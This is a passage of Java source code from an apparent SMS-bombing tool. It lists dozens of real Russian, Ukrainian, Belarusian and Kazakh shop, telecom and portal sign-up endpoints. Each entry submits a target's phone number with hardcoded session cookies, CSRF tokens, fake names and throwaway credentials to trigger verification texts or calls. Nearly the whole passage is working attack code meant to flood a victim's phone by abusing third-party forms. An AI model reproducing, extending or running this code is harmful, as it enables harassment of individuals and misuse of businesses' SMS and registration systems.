768131=eyJpdiI6IkQ0cGlZcVUzNXNxUXNPaTNjNEcwRnc9PSIsInZhbHVlIjoiUk5URkR1Y05Vclc1Y01qbE5aUzJCZkdtMmp1Qll5WlNNeXNpeDV2MzVDYmtUcUZrT1wvcUVlaU1ianQraU41RTU1NWVEZVNGMkNCaVZuREN6U2ppV29BPT0iLCJtYWMiOiJkOThjNGE5ZTQwNGQxNjAwMWI0YmI2NmRiZjk1OTExNTNhOWI4YzcwNGE0N2IzNDcyNDRmNzBhMmIyNmFmYTM5In0=; tel=eyJpdiI6IlhLa2ExTVJsc3plZ1c4cEFiRGFIM1E9PSIsInZhbHVlIjoiZDB2MFpiMERqZTMxTzdBUkRVb0dSUT09IiwibWFjIjoiMjliZDdiZWQxYzNiYzkwZTM2MjJjNGNiY2ZmODY5MzQxYzE0MWEzODgzYWYyNTM5Mzg5YjYxNzJkMmQ4MzU1YSJ9");
                        request.header("X-Requested-With", "XMLHttpRequest");
                    }
                },

                new FormService("https://id.kolesa.kz/getInfoAuth.json", 77) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("project", "market");
                        builder.add("login", "+" + phone.toString());
                        builder.add("csrf", "czhDbUhLR1E5YUh1dHllZ0ZOdlU0UT09");
                        builder.add("restore", "0");
                        builder.add("iteration", "primary");

                        request.header("cookie", "ccid=vur2iajjpti6u660kdkii4mlgd; ssaid=e020e420-401b-11ed-b971-fb3d2d634bd2; __tld__=null");
                        request.header("X-Requested-With", "XMLHttpRequest");
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        String formattedPhone = Phone.format(phone.getPhone(), "+7 (***) ***-**-**");

                        client.newCall(new Request.Builder()
                                .url("https://babylonvape.ru/auth/registration/?register=yes&backurl=%2Fauth%2F")
                                .header("upgrade-insecure-requests", "1")
                                .header("referer", "https://babylonvape.ru/auth/registration/?register=yes&backurl=/auth/")
                                .header("cookie", "PHPSESSID=9D26aEZS5EpjZlhsd1Y1NYWyAufAzpwp; BITRIX_SM_SALE_UID=c29417494cd049f7c5fcf28051ace9d2; rrpvid=780283164294524; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":5,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_debug=null; _ym_uid=1654436025122788696; _ym_d=1664632221; rcuid=6275fcd65368be000135cd22; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.877344353.1664632222; _gid=GA1.2.958698788.1664632222; rrwpswu=true; babylon_confirm_age=Y; _gat_gtag_UA_56968396_1=1")
                                .post(RequestBody.create("------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"backurl\"\n" +
                                                "\n" +
                                                "/auth/\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"register_submit_button\"\n" +
                                                "\n" +
                                                "reg\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[LOGIN]\"\n" +
                                                "\n" +
                                                "1\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[LAST_NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[SECOND_NAME]\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[EMAIL]\"\n" +
                                                "\n" +
                                                getEmail() +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PERSONAL_PHONE]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PASSWORD]\"\n" +
                                                "\n" +
                                                "qwerty\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[CONFIRM_PASSWORD]\"\n" +
                                                "\n" +
                                                "qwerty\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"licenses_register\"\n" +
                                                "\n" +
                                                "Y\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"REGISTER[PHONE_NUMBER]\"\n" +
                                                "\n" +
                                                formattedPhone +
                                                "\n------WebKitFormBoundaryZKfaTYUmRp781EJr\n" +
                                                "Content-Disposition: form-data; name=\"register_submit_button1\"\n" +
                                                "\n" +
                                                "Регистрация\n" +
                                                "------WebKitFormBoundaryZKfaTYUmRp781EJr--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZKfaTYUmRp781EJr")))
                                .build()).enqueue(callback);
                    }
                },

                new FormService("https://www.moyo.ua/identity/registration", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("cookie", "YII_CSRF_TOKEN=b5600a221539c29fd3628b4d0e682b65e8e51355; _hjSessionUser_1850514=eyJpZCI6ImY3MWQ2M2NhLTFmNjUtNTY5MC1hMDE4LTZjMzc1ZTM3NDk3MCIsImNyZWF0ZWQiOjE2NjUxNTMwMDY2NTEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1850514=eyJpZCI6IjgwZmI0YzgwLWI0YWUtNDgxNC04NGE2LTk0YmVkODQ0NjM0ZiIsImNyZWF0ZWQiOjE2NjUxNTMwMDg2MzYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; new_user_ga=1; no_detected_user_ga=0; PHPSESSID=fdeiilohmvd7o6t1lm1ghhmm66; g_state={\"i_p\":1665160212060,\"i_l\":1}");

                        builder.add("firstname", getRussianName());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380(**)***-**-**"));
                        builder.add("email", getEmail());
                    }
                },

                new FormService("https://sohorooms.ua/index.php?route=account/register/sms", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=6d0d51e8f0da1fe803f36f1c2f53dd01; language=ru; currency=UAH; screen=1536x864; nav=5.0 (Windows NT 10.0; tzo=-180; cd=24; language=ru; referer=sohorooms.ua; referer_marker=1; _gcl_au=1.1.1518637680.1665305924; _gid=GA1.2.1889716149.1665305924; _gat=1; _fbp=fb.1.1665305924935.1029977243; _ga_KFE70ENL3B=GS1.1.1665305924.1.1.1665305926.58.0.0; _ga=GA1.2.1706081357.1665305924; _hjSessionUser_2799148=eyJpZCI6ImQxNmFmZmYyLTJhOWMtNTMxMC1hMTZjLTU2Y2EyMTEwMWJkMiIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2799148=eyJpZCI6IjNkMGVmYmViLTlmYjctNDE0Yy04NTY4LTU1YzUxOGU4MDYzOSIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NjksImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; googtrans=/ru/uk; googtrans=/ru/uk");

                        builder.add("telephone", Phone.format(phone.getPhone(), "+38 (***) ***-**-**"));
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        String password = getEmail();

                        client.newCall(new Request.Builder()
                                .url("https://www.podrygka.ru/ajax/phone_confirm_code_validate.php")
                                .header("Cookie", "flocktory-uuid=fa9d7b5f-e63e-41ac-8b22-ca3d9cb43072-4; rrpvid=170226106135378; _gcl_au=1.1.1659345411.1665500180; rcuid=6275fcd65368be000135cd22; tmr_lvid=2dbe4e6285f3faa81cefd4b8f8722148; tmr_lvidTS=1665500200389; _gid=GA1.2.36819294.1665500201; _gaexp=GAX1.2.Vinba-iySqGfm4hVoZTHNg.19307.1; _ym_uid=1665500201989305824; _ym_d=1665500201; _ym_visorc=b; _userGUID=0:l94btgzf:8kxn3GOGsBMPYhUZsp9uMhA~IbOYNHP4; dSesn=a770fd10-00e7-53fb-6a46-2134675b5f0f; _dvs=0:l94btgzf:oWakvuAIPIustCKMEotfMlw8A5hyQW7C; BITRIX_SM_SALE_UID=911659922; PHPSESSID=fd931c99d850fa105bcb70c13ac96a95; tmr_detect=0|1665500362277; _ga_49YR0G3D1G=GS1.1.1665500200.1.1.1665500437.60.0.0; _ga_PNTGGG08RK=GS1.1.1665500200.1.1.1665500437.60.0.0; _ym_isad=2; _tt_enable_cookie=1; _ttp=39ad416f-d074-4b3b-88d0-74d3528eb8cc; uxs_uid=7896bf60-4975-11ed-9330-ad6a983eb59f; _ga=GA1.2.1755673402.1665500200; _gat_UA-46690290-1=1; tmr_reqNum=12")
                                .header("x-requested-with", "XMLHttpRequest")
                                .post(RequestBody.create("------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"redirectURL\"\n" +
                                                "\n" +
                                                "\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"repeat_password\"\n" +
                                                "\n" +
                                                password +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"sessid\"\n" +
                                                "\n" +
                                                "565e6d624ef833230324400a275412e0\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"first_name\"\n" +
                                                "\n" +
                                                getRussianName() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"last_name\"\n" +
                                                "\n" +
                                                getRussianName() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"email\"\n" +
                                                "\n" +
                                                getEmail() +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+7 ( *** ) *** ** **") +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"password\"\n" +
                                                "\n" +
                                                password +
                                                "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                                "Content-Disposition: form-data; name=\"agree_personal\"\n" +
                                                "\n" +
                                                "Y\n" +
                                                "------WebKitFormBoundary8VnGsAfzm5mtbFjn--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundary8VnGsAfzm5mtbFjn")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://bi.ua/api/v1/accounts", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "advanced-frontend=m175oep0fvf67qpl3epn8sp60u; _csrf-frontend=88e5d09991180d498981d8431cf84d8db27f5f1f126057fbcc3150fb8b2b14d6a:2:{i:0;s:14:\"_csrf-frontend\";i:1;s:32:\"zYPJtL4SUUfp6FnPeozLAPWWl1RHVXWg\";}; _gcl_au=1.1.220301665.1666887102; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_first_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); _gid=GA1.2.53598285.1666887102; _hjFirstSeen=1; _hjSession_1559188=eyJpZCI6IjdmZjk4ZjUxLThjZGEtNGYzMy05ZTczLWUxNzcyNDA1MmUyMSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzNzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1666887103435.206244386; _p_uid=uid-2e5d5cf42.484adb2db.3d26406f7; _hjSessionUser_1559188=eyJpZCI6IjQ3ZDlkZDBiLTQ4ZDItNTdhOC05YjkyLTA3YjI2MGM2NDZjOSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzMTksImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample=0; sbjs_udata=vst=2|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52; sbjs_session=pgs=1|||cpg=https://bi.ua/ukr/signup/; _dc_gtm_UA-8203486-4=1; _ga_71EP10GZSQ=GS1.1.1666889396.2.1.1666889403.53.0.0; _ga=GA1.1.228057617.1666887102; _gali=emailPhone");
                        request.header("language", "uk");

                        try {
                            return new JSONObject()
                                    .put("grand_type", "call_code")
                                    .put("login", getRussianName())
                                    .put("phone", phone.toString())
                                    .put("stage", "1")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://registration.vodafone.ua/api/v1/process/smsCode", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("number", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://megasport.ua/api/auth/phone/?language=ua", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("phone", "+" + phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://lc.rt.ru/backend/api/lk/user", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "9f4f336f6f7d6675fa0f0e9148c541ed=d6acbdd529a9190f323b42f389c69cbc; 3ab55dd37f775ece19b2e3ceee2c84f5=a5b234824bc53bee9a3e12d3c3df7a96; _ym_uid=1666890907592977795; _ym_d=1666890907; amplitude_id_203a27827b8ff81b5b583aa58b07799brt.ru=eyJkZXZpY2VJZCI6IjI3MTU3YWJkLWMxOTgtNDU1Ni05ZThiLTVkMTRiMTViOTNiYVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY2Njg5MDkwNjkyNywibGFzdEV2ZW50VGltZSI6MTY2Njg5MDkwNjkyNywiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; _ym_visorc=w; ahoy_visitor=f84331f8-a3d6-4ca9-bd4b-fbb313b7b07a; ahoy_visit=5c322d7d-24e3-4716-9cee-61763f8ece19; _ym_isad=2; _a_d3t6sf=duMvII_RZFH2V0RbH3OHtSJP; _edtech_session=yVwf56MV9mW+fMURg6WTDi9KlKTWuiwxtyJNdaMixpDqGZR9QzCDYuB3tScZ+ZIRXhVNjUy/EI2As6rMgj/qWhXM8ZC7xXo=--pz5saz3tM1rt/Axo--AqlZIt6hBq68BAEuztHwEA==; TS01f13338=0194c94451ad1f787e1ee5e671fda0c838612d15f13c1258e0c407d9871c53096381b029b87318c8a07e108f1092a9b783fdd2c2c90a0efa6c7c46a98db95cdb29c39619d2a6203a2d5cb43cbaa53528a7c61d7d5a7489eb1dc4028e48c65fcf514d7a6a2c79f325038c97ad39086d017e5f9358f6");

                        try {
                            return new JSONObject()
                                    .put("email", "admin@bomber.cc")
                                    .put("first_name", getRussianName())
                                    .put("grade_tag", "1 класс")
                                    .put("last_name", getRussianName())
                                    .put("password", "123456789qwertyQWERTY_")
                                    .put("password_confirmation", "123456789qwertyQWERTY_")
                                    .put("phone", phone.getPhone())
                                    .put("region_id", "77")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://ilmolino.ua/api/v1/user/auth", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "dae23e1f6b5bf8609e2224d695520311=uk-UA; _ga=GA1.2.1143011635.1665315863; 5c56ddacb7d52afbab2130776ac59994=t3ur4081qmdghtv0p3qvr12m5f; _fbp=fb.1.1666892652193.1052781207; _gid=GA1.2.1914159569.1666892656; _gat_gtag_UA_200520041_1=1");

                        builder.add("phone", "0" + phone.getPhone());
                        builder.add("need_skeep", "");
                    }
                },

                new JsonService("https://shop.milavitsa.by/api/accounts/signUp", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_ym_uid=1669561951420317747; _ym_d=1669561951; _ga_1N8M41LBJN=GS1.1.1669561950.1.0.1669561950.0.0.0; _ga=GA1.1.1063980318.1669561951; _ym_visorc=w; _ym_isad=2");

                        try {
                            return new JSONObject()
                                    .put("email", "bayeyip588@runfons.com")
                                    .put("name", getRussianName())
                                    .put("password", "Eeza.zBw_RQnRx7")
                                    .put("passwordConfirm", "Eeza.zBw_RQnRx7")
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://e-zoo.by/local/gtools/login/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+375(**)*** ** **"));
                    }
                },

                new ParamsService("https://myfin.by/send-code/verify", 375) {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("cookie", "_ym_uid=16701561781022942428; _ym_d=1670156178; _fbp=fb.1.1670156178980.265937461; _csrf=94355b3458805f379ef8f8bb595e1efe5c736145b680d3ca0b6b6e1075355d0ea:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"aGKKPUlt553LKlYGo4MCSpOnadr - opGA\";}; PHPSESSID=0pr0eiesva2sck5i7spck8c0d5; _ym_isad=2; _ym_visorc=b; _ga_MBM86B183B=GS1.1.1671291859.3.0.1671291859.0.0.0; _ga=GA1.2.832821120.1670156179; _gid=GA1.2.52421973.1671291860; _gat_UA-33127175-1=1");
                        request.header("x-csrf-token", "4MD0-i3YOqmZnr8ow6WKZEku5BC13JoWgTEHQY1bg5uBh7-xfY1W3ayrjGSIydMjJhqpU-as1XjgVXVs4ivE2g==");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.addQueryParameter("action", "sendSms");
                        builder.addQueryParameter("phone", Phone.format(phone.getPhone(), "375(**)***-**-**"));
                        builder.addQueryParameter("userIdentityId", "undefined");
                        builder.addQueryParameter("ga", "GA1.2.832821120.1670156179");
                    }
                },

                new FormService("https://belwest.by/ru/register/sendCode", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "JSESSIONID=3128BE9342EDB0870F1A110B21CEBEDE; cookie-notification=NOT_ACCEPTED; _gid=GA1.2.1133217827.1670156447; _gat_UA-102366257-1=1; _gat_UA-102366257-3=1; _fbp=fb.1.1670156446924.1246257691; _clck=1dikqyz|1|f74|0; _ym_uid=167015644875968174; _ym_d=1670156448; _ym_isad=2; _ym_visorc=w; _ga_3PWZCWZ7CZ=GS1.1.1670156447.1.1.1670156471.0.0.0; _ga=GA1.2.281260943.1670156447; _clsk=uolfne|1670156472944|2|1|i.clarity.ms/collect");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("mobileNumber", phone.getPhone());
                        builder.add("mobileNumberCode", phone.getCountryCode());
                        builder.add("CSRFToken", "46031ff7-214b-41fc-80f6-96d251219626");
                    }
                },

                new FormService("https://shop.by/management/user/register/?phone=2&lctn=shopby/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "csrf-token=RJUejcwixKQ1xRcJ; _gid=GA1.2.1680945104.1670156802; _ym_uid=1670156803918643804; _ym_d=1670156803; _gcl_au=1.1.1670310313.1670156803; _gat=1; tmr_lvid=b675e317596c82679c35aa345dd1c925; tmr_lvidTS=1670156803069; _ym_isad=2; _ga=GA1.1.779770407.1670156802; tmr_detect=0|1670156806498; PHPSESSID=lsi108lvrs9arj36vev8ub9ht5; _ga_820MZ1YKJX=GS1.1.1670156803.1.0.1670156817.46.0.0");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("LRegisterForm[phone]", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("LRegisterForm[personal_data_privacy_policy]", "0");
                        builder.add("LRegisterForm[personal_data_privacy_policy]", "1");
                    }
                },

                new FormService("https://vprok.prostore.by/get-assistant-code", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_ym_uid=1670157057914379197; _ym_d=1670157057; _ga=GA1.2.1178854623.1670157057; _gid=GA1.2.239203896.1670157057; _gat_gtag_UA_163877616_1=1; _gat=1; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6InFUUVI1bnpcL245bG1nR3hEUDlBSDlRPT0iLCJ2YWx1ZSI6InE4NVdIc1daUFRTVlwvYU83RlZHT3pVR0puWFZVeHhpcWJzZlVSRHN3RXhzcnJjbHNmOXRvXC8rT2RtdWF0YW9ReiIsIm1hYyI6IjQxOTBkMzg4MTVjNmE4ODQ1ZDAyMWE4NTNmZDYxNGU2NzQ1M2ZmYWZiYWNmZTk1NTUxZThjY2YyZDMzZGY4OGYifQ==; laravel_session=eyJpdiI6InpXVGd6U2V4VXFER0ZlXC9zXC9VWkI0dz09IiwidmFsdWUiOiJEdDVXcFl2QkZYVWlFWjBlVTllVTErc3R4R3g4RENiTXR3ak1rek1HNzY5OGZBb2hEM0xxcUh0SXRHaFA3aU9OcFBcLytkZ3Z4T2sxQnBjV3lTUWxCVUFzMHVMVjRLd0dXYnhMc0NQcWVyUWlmTVNIVGM2NWFFa2NiWW9oYlQzV2giLCJtYWMiOiIyOGJhZmJiNjc5ZjAyODg1NjhkNzJiZmJiMmZkMDIwMjRlNTRlM2M0OTdjZDU0NGRhNTg3ZGZkNjA4YzkxYzgxIn0=");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("register_phone", Phone.format(phone.getPhone(), "(**) *** ** **"));
                        builder.add("_token", "RPKvgHhO1hiwEaYNfre7og7JiwD4ArxDrp4umzhW");
                    }
                },

                new JsonService("https://www.slivki.by/login/phone/send-code", "PATCH") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "PHPSESSID=r6uocec2pcnjpnr9fjls12g7el; _gid=GA1.2.674791248.1670157758; _ga_VGFW27H90X=GS1.1.1670157757.1.0.1670157757.0.0.0; _ga=GA1.1.272570267.1670157758; _fbp=fb.1.1670157758128.294592220; _tt_enable_cookie=1; _ttp=57c80ff9-4ea7-4ec1-b60a-78ab42fd080c; _ym_uid=1670157760103754562; _ym_d=1670157760; refresh=1; fullSiteBanner1=babahnem-baj; _ym_isad=2; googtrans=null; googtrans=null; googtrans=null");

                        try {
                            return new JSONObject()
                                    .put("phoneNumber", "+" + phone.getCountryCode() + Phone.format(phone.getPhone(), "******-**-**"))
                                    .put("token", "acb6aea77.KMOmk0lXMQw24Jdp3cfj3DAhf7f_6V9PormobRsXxQk.GKjk3wpjQn18rqQB6JWqkR1TOPSejAwE1szMVXVk8XlLt5ThMw95PEWnwg")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://xn--80aeec0cfsgl1g.xn--p1ai/register/sms")
                                .header("x-xsrf-token", "eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9")
                                .header("Cookie", "_ga=GA1.2.1794528238.1670160259; _gid=GA1.2.2107102391.1670160259; _ym_uid=1670160260319820000; _ym_d=1670160260; _ym_isad=2; _ym_visorc=w; tmr_lvid=48e6229f0b5dd99ebdc841777c57c535; tmr_lvidTS=1670160262034; _fbp=fb.1.1670160262307.2060817164; tmr_detect=0|1670160268941; XSRF-TOKEN=eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9; podatvsudrf_session=eyJpdiI6Iml6U1F3R0syeDNDMTVSSXV1UWZ3VVE9PSIsInZhbHVlIjoiOHY0ZDVVV1hNcGhlSmEweGxQZklnRjY0V2htZ2YreG5GaG9YS3lGVFpIWGlEQjdtNTRPRjFHRjlDbEdBbVJ6RCIsIm1hYyI6IjQxMjRlNWNmYjU2NjQ4N2I3ZWU1YzVhNGJkMTI1YTY4YTY0YzViODZlMDIyMDIzY2RmNGMyNDVhMWQzZjVjOTUifQ==")
                                .post(RequestBody.create("------WebKitFormBoundaryojtGN2EYSA0JevB6\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                phone +
                                                "\n" +
                                                "------WebKitFormBoundaryojtGN2EYSA0JevB6--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryojtGN2EYSA0JevB6")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://delivio.by/be/api/register", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.1476918049.1670159308; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.2091401158.1670159308; _ym_uid=1670159309267213207; _ym_d=1670159309; _fbp=fb.1.1670159309067.59569870; _ga=GA1.2.170754787.1670159308; _ga_SK36CGG6EZ=GS1.1.1670170177.2.1.1670170181.56.0.0; _ym_isad=2");

                        try {
                            return new JSONObject()
                                    .put("phone", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://imarket.by/ajax/auth.php", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "BITRIX_SM_GUEST_ID=29787461; BITRIX_SM_is_mobile=N; BITRIX_SM_SALE_UID=1105317986; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gcl_au=1.1.1013370155.1670159832; _gid=GA1.2.393902877.1670159832; tmr_lvid=8a0e231161a3fa361d43504aa1f00459; tmr_lvidTS=1670159832283; _ym_uid=1670159833318352265; _ym_d=1670159833; enPop_sessionId=f6dadec7-73d5-11ed-b494-ea4186e0ba49; _ms=1529516c-d7d6-40d3-b567-d1a56c996a55; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; clickanalyticsresource=ef8556dd-b8be-47a4-8a36-a41b5c8ec1ea; PHPSESSID=Kd4Bx0rSsKWDxx24PP1mWvZLbQ3ZfUAf; _gat_UA-54357557-1=1; _ga_HKDSD3883C=GS1.1.1670174396.2.0.1670174396.60.0.0; _ga=GA1.1.992877548.1670159832; _ym_visorc=b; tmr_detect=0|1670174398465; BITRIX_SM_LAST_VISIT=04.12.2022+20:20:04");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("action", "phoneReg");
                        builder.add("PHONE_NUMBER", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("PHONE_CODE", "");
                    }
                },

                new JsonService("https://monro24.by/user-account/auth-api-v2/requestProcessor.php") {
                    @Override
                    public String buildJson(Phone phone) {
